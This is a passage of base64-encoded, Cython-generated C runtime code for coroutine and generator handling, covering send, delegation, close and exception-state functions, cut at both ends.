5nRXJyb3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHtcbiAgICBjb25zdCBjaGFyICptc2c7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBpZiAoKDApKSB7XG4gICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soKFB5T2JqZWN0KilnZW4pKSB7XG4gICAgICAgIG1zZyA9ICJjb3JvdXRpbmUgYWxyZWFkeSBleGVjdXRpbmciO1xuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgfSBlbHNlIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KChQeU9iamVjdCopZ2VuKSkge1xuICAgICAgICBtc2cgPSAiYXN5bmMgZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjtcbiAgICAjZW5kaWZcbiAgICB9IGVsc2Uge1xuICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjtcbiAgICB9XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1ZhbHVlRXJyb3IsIG1zZyk7XG59XG5zdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVRlcm1pbmF0ZWRFcnJvcihQeU9iamVjdCAqZ2VuLCBQeU9iamVjdCAqdmFsdWUsIGludCBjbG9zaW5nKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihjbG9zaW5nKTtcbiAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRURcbiAgICBpZiAoIWNsb3NpbmcgJiYgX19QeXhfQ29yb3V0aW5lX0NoZWNrKGdlbikpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgImNhbm5vdCByZXVzZSBhbHJlYWR5IGF3YWl0ZWQgY29yb3V0aW5lIik7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgaWYgKHZhbHVlKSB7XG4gICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KGdlbikpXG4gICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7XG4gICAgICAgIGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7XG4gICAgfVxufVxuc3RhdGljXG5fX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX1NlbmRFeChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXN1bHQsIGludCBjbG9zaW5nKSB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlO1xuICAgIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZTtcbiAgICBQeU9iamVjdCAqcmV0dmFsO1xuICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoc2VsZikpOyAgLy8gQ2FsbGVycyBzaG91bGQgZW5zdXJlIGlzX3J1bm5pbmdcbiAgICBpZiAodW5saWtlbHkoc2VsZi0+cmVzdW1lX2xhYmVsID09IC0xKSkge1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVRlcm1pbmF0ZWRFcnJvcigoUHlPYmplY3QqKXNlbGYsIHZhbHVlLCBjbG9zaW5nKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIHRzdGF0ZSA9IF9fcHl4X3RzdGF0ZTtcbiNlbHNlXG4gICAgdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50O1xuI2VuZGlmXG4gICAgZXhjX3N0YXRlID0gJnNlbGYtPmdpX2V4Y19zdGF0ZTtcbiAgICBpZiAoZXhjX3N0YXRlLT5leGNfdmFsdWUpIHtcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgICAgICNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICpleGNfdGI7XG4gICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgZXhjX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTtcbiAgICAgICAgI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgICAgICBleGNfdGIgPSAoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKS0+dHJhY2ViYWNrO1xuICAgICAgICAjZWxzZVxuICAgICAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAoZXhjX3RiKSB7XG4gICAgICAgICAgICBQeVRyYWNlYmFja09iamVjdCAqdGIgPSAoUHlUcmFjZWJhY2tPYmplY3QgKikgZXhjX3RiO1xuICAgICAgICAgICAgUHlGcmFtZU9iamVjdCAqZiA9IHRiLT50Yl9mcmFtZTtcbiAgICAgICAgICAgIGFzc2VydChmLT5mX2JhY2sgPT0gTlVMTCk7XG4gICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMVxuICAgICAgICAgICAgZi0+Zl9iYWNrID0gUHlUaHJlYWRTdGF0ZV9HZXRGcmFtZSh0c3RhdGUpO1xuICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIFB5X1hJTkNSRUYodHN0YXRlLT5mcmFtZSk7XG4gICAgICAgICAgICBmLT5mX2JhY2sgPSB0c3RhdGUtPmZyYW1lO1xuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgICAgICBQeV9ERUNSRUYoZXhjX3RiKTtcbiAgICAgICAgICAgICNlbmRpZlxuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgZXhjX3N0YXRlLT5wcmV2aW91c19pdGVtID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICB0c3RhdGUtPmV4Y19pbmZvID0gZXhjX3N0YXRlO1xuI2Vsc2VcbiAgICBpZiAoZXhjX3N0YXRlLT5leGNfdHlwZSkge1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcihleGNfc3RhdGUpO1xuICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZleGNfc3RhdGUtPmV4Y190eXBlLCAmZXhjX3N0YXRlLT5leGNfdmFsdWUsICZleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spO1xuICAgIH1cbiNlbmRpZlxuICAgIHJldHZhbCA9IHNlbGYtPmJvZHkoc2VsZiwgdHN0YXRlLCB2YWx1ZSk7XG4jaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgIGV4Y19zdGF0ZSA9ICZzZWxmLT5naV9leGNfc3RhdGU7XG4gICAgdHN0YXRlLT5leGNfaW5mbyA9IGV4Y19zdGF0ZS0+cHJldmlvdXNfaXRlbTtcbiAgICBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW0gPSBOVUxMO1xuICAgIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoZXhjX3N0YXRlKTtcbiNlbmRpZlxuICAgICpyZXN1bHQgPSByZXR2YWw7XG4gICAgaWYgKHNlbGYtPnJlc3VtZV9sYWJlbCA9PSAtMSkge1xuICAgICAgICByZXR1cm4gbGlrZWx5KHJldHZhbCkgPyBQWUdFTl9SRVRVUk4gOiBQWUdFTl9FUlJPUjtcbiAgICB9XG4gICAgcmV0dXJuIFBZR0VOX05FWFQ7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0Nvcm91dGluZV9SZXNldEZyYW1lQmFja3BvaW50ZXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihleGNfc3RhdGUpO1xuI2Vsc2VcbiAgICBQeU9iamVjdCAqZXhjX3RiO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgaWYgKCFleGNfc3RhdGUtPmV4Y192YWx1ZSkgcmV0dXJuO1xuICAgIGV4Y190YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfc3RhdGUtPmV4Y192YWx1ZSk7XG4gICAgI2Vsc2VcbiAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgI2VuZGlmXG4gICAgaWYgKGxpa2VseShleGNfdGIpKSB7XG4gICAgICAgIFB5VHJhY2ViYWNrT2JqZWN0ICp0YiA9IChQeVRyYWNlYmFja09iamVjdCAqKSBleGNfdGI7XG4gICAgICAgIFB5RnJhbWVPYmplY3QgKmYgPSB0Yi0+dGJfZnJhbWU7XG4gICAgICAgIFB5X0NMRUFSKGYtPmZfYmFjayk7XG4gICAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgICAgIFB5X0RFQ1JFRihleGNfdGIpO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4jZW5kaWZcbn1cbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoZ2VuLCByZXN1bHQsIHJldHZhbCwgaXRlcm5leHQpXFxcbiAgICAoKHJlc3VsdCkgPT0gUFlHRU5fTkVYVCA/IChyZXR2YWwpIDogX19QeXhfX0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KGdlbiwgcmVzdWx0LCByZXR2YWwsIGl0ZXJuZXh0KSlcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9fQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoUHlPYmplY3QqIGdlbiwgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCwgUHlPYmplY3QgKnJldHZhbCwgaW50IGl0ZXJuZXh0KSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBpZiAobGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4pKSB7XG4gICAgICAgIGludCBpc19hc3luYyA9IDA7XG4gICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgICAgIGlzX2FzeW5jID0gX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChnZW4pO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24ocmV0dmFsLCBpc19hc3luYywgaXRlcm5leHQpO1xuICAgICAgICBQeV9YREVDUkVGKHJldHZhbCk7XG4gICAgfVxuICAgIHJldHVybiBOVUxMO1xufVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkVcblB5T2JqZWN0ICpfX1B5eF9QeUdlbl9TZW5kKFB5R2VuT2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmcpIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8PSAweDAzMEEwMEExXG4gICAgcmV0dXJuIF9QeUdlbl9TZW5kKGdlbiwgYXJnKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBpZiAoUHlJdGVyX1NlbmQoKFB5T2JqZWN0KilnZW4sIGFyZyA/IGFyZyA6IFB5X05vbmUsICZyZXN1bHQpID09IFBZR0VOX1JFVFVSTikge1xuICAgICAgICBpZiAoUHlBc3luY0dlbl9DaGVja0V4YWN0KGdlbikpIHtcbiAgICAgICAgICAgIGFzc2VydChyZXN1bHQgPT0gUHlfTm9uZSk7XG4gICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSBpZiAocmVzdWx0ID09IFB5X05vbmUpIHtcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMEExXG4gICAgICAgICAgICBfUHlHZW5fU2V0U3RvcEl0ZXJhdGlvblZhbHVlKHJlc3VsdCk7XG4jZWxzZVxuICAgICAgICAgICAgaWYgKCFQeVR1cGxlX0NoZWNrKHJlc3VsdCkgJiYgIVB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2socmVzdWx0KSkge1xuICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqZXhjID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpO1xuICAgICAgICAgICAgICAgIGlmIChsaWtlbHkoZXhjICE9IE5VTEwpKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19TdG9wSXRlcmF0aW9uLCBleGMpO1xuICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZXhjKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTtcbiAgICAgICAgcmVzdWx0ID0gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBfX1B5eF9QeVNlbmRSZXN1bHRcbl9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBQeU9iamVjdCoqIHJldHZhbCkge1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKnZhbCA9IE5VTEw7XG4gICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhnZW4pKTtcbiAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsICZ2YWwpO1xuICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCB2YWwsIHJldHZhbCwgMCk7XG4gICAgUHlfWERFQ1JFRih2YWwpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBnZW5fYW1fc2VuZCwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCkge1xuICAgIFB5T2JqZWN0ICpyZXQgPSBOVUxMO1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCBkZWxlZ2F0ZV9yZXN1bHQsIHJlc3VsdDtcbiAgICBhc3NlcnQoX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKGdlbikpO1xuICAgIGRlbGVnYXRlX3Jlc3VsdCA9IGdlbl9hbV9zZW5kKGdlbi0+eWllbGRmcm9tLCB2YWx1ZSwgJnJldCk7XG4gICAgaWYgKGRlbGVnYXRlX3Jlc3VsdCA9PSBQWUdFTl9ORVhUKSB7XG4gICAgICAgIGFzc2VydCAocmV0ICE9IE5VTEwpO1xuICAgICAgICAqcmV0dmFsID0gcmV0O1xuICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDtcbiAgICB9XG4gICAgYXNzZXJ0IChkZWxlZ2F0ZV9yZXN1bHQgIT0gUFlHRU5fRVJST1IgfHwgcmV0ID09IE5VTEwpO1xuICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIHJldCwgcmV0dmFsLCAwKTtcbiAgICBQeV9YREVDUkVGKHJldCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlKSB7XG4gICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9BbVNlbmQoc2VsZiwgdmFsdWUsICZyZXR2YWwpO1xuICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMCk7XG59XG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfQW1TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKSB7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHtcbiAgICAgICAgKnJldHZhbCA9IF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7XG4gICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjtcbiAgICB9XG4gICAgI2lmIENZVEhPTl9VU0VfQU1fU0VORFxuICAgIGlmIChnZW4tPnlpZWxkZnJvbV9hbV9zZW5kKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShnZW4sIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQsIHZhbHVlLCByZXR2YWwpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgIGlmIChnZW4tPnlpZWxkZnJvbSkge1xuICAgICAgICBQeU9iamVjdCAqeWYgPSBnZW4tPnlpZWxkZnJvbTtcbiAgICAgICAgUHlPYmplY3QgKnJldDtcbiAgICAgICNpZiAhQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRFxuICAgICAgICBpZiAoX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgICAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmQoeWYsIHZhbHVlKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRFxuICAgICAgICBpZiAoX19weXhfUHlBc3luY0dlbkFTZW5kX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9hc3luY19nZW5fYXNlbmRfc2VuZCh5ZiwgdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgaWYgKFB5R2VuX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIHZhbHVlID09IFB5X05vbmUgPyBOVUxMIDogdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgaWYgKFB5Q29yb19DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCB2YWx1ZSA9PSBQeV9Ob25lID8gTlVMTCA6IHZhbHVlKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICAgICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDBcbiAgICAgICAgICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lICYmIFB5SXRlcl9DaGVjayh5ZikpXG4gICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlJdGVyX05leHRfUGxhaW4oeWYpO1xuICAgICAgICAgICAgZWxzZVxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoeWYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZW5kLCB2YWx1ZSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGxpa2VseShyZXQpKSB7XG4gICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICAgICAgKnJldHZhbCA9IHJldDtcbiAgICAgICAgICAgIHJldHVybiBQWUdFTl9ORVhUO1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgcmV0dmFsKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgdmFsdWUsIHJldHZhbCwgMCk7XG4gICAgfVxuICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlSXRlcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgUHlPYmplY3QgKnlmKSB7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihnZW4pO1xuICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoZ2VuKSk7XG4gICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoeWYsICZyZXR2YWwpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZSh5ZiwgJnJldHZhbCk7XG4gICAgfSBlbHNlXG4gICAgaWYgKF9fUHl4X0Nvcm91dGluZUF3YWl0X0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZUF3YWl0X0Nsb3NlKChfX3B5eF9Db3JvdXRpbmVBd2FpdE9iamVjdCopeWYpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BU2VuZF9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICByZXR2YWwgPSBfX1B5eF9hc3luY19nZW5fYXNlbmRfY2xvc2UoeWYsIE5VTEwpO1xuICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47XG4gICAgfSBlbHNlXG4gICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BVGhyb3dfQ2hlY2tFeGFjdCh5ZikpIHtcbiAgICAgICAgcmV0dmFsID0gX19QeXhfYXN5bmNfZ2VuX2F0aHJvd19jbG9zZSh5ZiwgTlVMTCk7XG4gICAgICAgIHJlc3VsdCA9IFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2VcbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICptZXRoO1xuICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47XG4gICAgICAgIG1ldGggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcih5ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nsb3NlKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtZXRoKSkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHlmKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhtZXRoKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmV0dmFsKSkge1xuICAgICAgICAgICAgICAgIHJlc3VsdCA9IFBZR0VOX0VSUk9SO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfVxuICAgIFB5X1hERUNSRUYocmV0dmFsKTtcbiAgICByZXR1cm4gcmVzdWx0ID09IFBZR0VOX0VSUk9SID8gLTEgOiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZW5lcmF0b3JfTmV4dChQeU9iamVjdCAqc2VsZikge1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0Kikgc2VsZjtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgaWYgKGdlbi0+eWllbGRmcm9tX2FtX3NlbmQpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29